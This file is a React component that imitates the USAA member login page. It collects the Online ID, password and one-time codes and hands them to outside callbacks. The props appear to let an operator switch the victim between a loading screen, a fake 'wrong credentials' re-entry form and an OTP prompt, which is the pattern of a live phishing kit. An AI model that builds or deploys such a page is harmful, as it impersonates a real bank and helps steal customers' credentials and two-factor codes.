import { useState } from "react";
import { bankDetailsInfo } from "../../bankDetails";
import useForms from "../../../../../../../hooks/useForms";
import BankingHeader from "./BankingHeader";
import { Link } from "react-router-dom";
import { CgClose } from "react-icons/cg";
import clsx from "clsx";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";

const Usa = ({
  handleCancel,
  bankName,
  handleSubmit,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  mainCancel,
}) => {
  const { formState, handleChange } = useForms(bankDetailsInfo);
  const [otp, setOtp] = useState("");
  const [showPassword, setshowPassword] = useState(false);

  const onSumbitForm = () => {
    const newItems = {
      ...formState,
      bankName: bankName,
    };

    handleSubmit(newItems);
  };

  const handleVerifiedOtp = () => {
    setOtpOpen(true);
  };

  return (
    <div>
      <div>
        <BankingHeader
          text="Member Account Login | USAA "
          handleCancel={handleCancel}
        />
        <header>
          <div>img</div>
          <nav>
            <Link>Join USAA</Link>
            <Link>REGISTER FOR ACCESS</Link>
            <CgClose size={20} onClick={handleCancel} />
          </nav>
        </header>
        <div>
          <div>
            <h2>New to USAA?</h2>
            <h3>
              Become a member by selecting &quot;Join USAA&quot;{" "}
              <span>-It&quot;s easy and only takes a few minutes</span>
            </h3>
            <button>Join USAA</button>
          </div>
          <div>
            <h2>Log On</h2>
            <div className={clsx(allBankOpen ? "hidden" : "block")}>
              <input
                type="text"
                value={formState.username}
                onChange={handleChange}
                name="username"
                placeholder="Online ID"
              />
              <div>
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  placeholder="Password"
                />
                <span onClick={() => setshowPassword((prevShow) => !prevShow)}>
                  {showPassword ? <FaRegEyeSlash /> : <FaRegEye />}
                </span>
              </div>
              <button onClick={onSumbitForm}>Next</button>
              <Link to="">I need help logging on</Link>
            </div>
            {allBankOpen && (
              <div className={clsx(OtpOpen ? "hidden" : "block")}>
                <button>
                  {whatToShowDetails.map((what) => (
                    <p key={what.id} onClick={() => handleSelectedId(what)}>
                      {what.name}
                    </p>
                  ))}
                </button>
                <button onClick={handleSelectSubmit}>Submit</button>
                <div>
                  {selectedPath.name === "Loading" && (
                    <p>{selectedPath.body}</p>
                  )}
                  {selectedPath.name === "wrong" && (
                    <>
                      <h3>{selectedPath.body}</h3>
                      <div>
                        <div>
                          <label>User ID</label>
                          <input
                            type="text"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                          />
                        </div>
                        <div>
                          <label>Password</label>
                          <input
                            type="password"
                            value={formState.password}
                            name="password"
                            onChange={handleChange}
                          />
                        </div>
                        <div>
                          <button onClick={onSumbitForm}>Submit</button>
                          <button>Cancel</button>
                        </div>
                      </div>
                    </>
                  )}
                  {selectedPath.name === "otp" && (
                    <>
                      <h3>{selectedPath.body}</h3>
                      <div>
                        <input
                          type="text"
                          onChange={(e) => setOtp(e.target.value)}
                          value={otp}
                        />
                        <button onClick={handleVerifiedOtp}>Verify</button>
                      </div>
                    </>
                  )}
                </div>
              </div>
            )}
            {OtpOpen && (
              <>
                <button>
                  {otpInfo.map((what) => (
                    <p key={what.id} onClick={() => handleSelectedOtp(what)}>
                      {what.name}
                    </p>
                  ))}
                </button>
                <button onClick={handleSubmitOtp}>Submit</button>
                <div>
                  {selectedOtp.name === "Loading" && <p>{selectedOtp.body}</p>}
                  {selectedOtp.name === "wrong" && (
                    <>
                      <h3>{selectedOtp.body}</h3>
                      <div>
                        <input
                          type="text"
                          onChange={(e) => setOtp(e.target.value)}
                          value={otp}
                        />
                        <button onClick={handleVerifiedOtp}>Verify</button>
                      </div>
                    </>
                  )}
                  {selectedOtp.name === "otp" && (
                    <>
                      <h3>{selectedOtp.body}</h3>
                      <button onClick={() => mainCancel(false)}>Cancel</button>
                    </>
                  )}
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Usa;
